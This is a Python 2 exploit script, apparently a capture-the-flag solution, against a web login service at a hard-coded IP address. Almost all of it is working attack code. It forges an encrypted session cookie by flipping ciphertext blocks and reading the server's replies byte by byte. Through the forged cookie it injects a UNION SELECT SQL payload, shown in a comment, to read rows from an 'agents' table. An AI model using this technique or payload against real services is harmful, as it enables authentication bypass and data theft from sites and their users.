from base64 import b64decode, b64encode
import urllib
import os
import sys

import requests

# Filters: ' _ in (( pro or and group
# Columns: no, rank
URL = 'http://110.10.212.147:24135/?p=secret_login'

cookie = 'QUWBPscLRhg%3D%7CKTwXZ6BPHP%2FSLTJWZnvk3OScLSc5%2F29PdAaCwsI5DmssvUiJtPmnjPNJGRmvLRccEFf3UKu4bklun1%2BCG0MM7w%3D%3D'
cookie = urllib.unquote(cookie)

iv, data = map(b64decode, cookie.split('|'))
'''
MESSAGE \
FROM SPY\
<!--TABL\
E:agents\
 NUMBER \
OF COLUM\
NS:5-->;\
SPY;66\x02\x02
'''

data = data


def generate_cookie(iv, data):
    return urllib.quote('|'.join(map(b64encode, (iv, data))))


def string_xor(s1, s2):
    assert(len(s1) == len(s2))
    ret = ''
    for i in range(len(s1)):
        ret += chr(ord(s1[i]) ^ ord(s2[i]))
    return ret


def oracle_pad(msg):
    remainder = 8 - len(msg) % 8
    msg += chr(remainder)*remainder
    return msg


def send_payload(payload):
    fake = generate_cookie(payload[:8], payload[8:])
    r = requests.get(URL, cookies={'identify': fake})

    result = r.content.split('<title>liiumlntl Iogln</title>\n')[1]

    if 'Is that all? HACKER?' in result:
        print '!! Hacking Detected !!'
        return 'HACK'

    if 'Hello, ' in result:
        after_hello = result[20:]
        if not after_hello.startswith('<br>'):
            return after_hello

    return None


# NAME & RANK should not contain ;
NAME = sys.argv[1]
RANK = sys.argv[2]  # 0 union select 1,2,a.4,4,5 from (select 1,2,3,4,5 union select * from agents where rank=0 limit 1,1)a

target = oracle_pad(';' + NAME + ';' + RANK)

last_block = 'SPY;66\x02\x02'
tail = string_xor(data[-16:-8], string_xor(last_block, target[-8:]))+data[-8:]

num_block = len(target) // 8 + 1

for block_idx in range(num_block-3, -1, -1):
    dummy = os.urandom(7)
    while send_payload(chr(0) + dummy + tail):
        dummy = os.urandom(7)

    # inject ;
    success = False

    for byte in range(256):
        payload = chr(byte) + dummy + tail
        print "Trying block {}, byte {}".format(block_idx, byte)

        after_hello = send_payload(payload)
        if after_hello and after_hello != 'HACK' and not after_hello.startswith(RANK):
            tail = string_xor(target[8*(block_idx):8*(block_idx+1)], string_xor(chr(byte)+dummy, ';'+after_hello[:7])) + tail
            success = True
            break

    if not success:
        print '!! invalid payload !!'
        exit(0)


fake = generate_cookie(tail[:8], tail[8:])
r = requests.get(URL, cookies={'identify': fake})
result = r.content.split('<title>liiumlntl Iogln</title>\n')[1]

print result

print fake
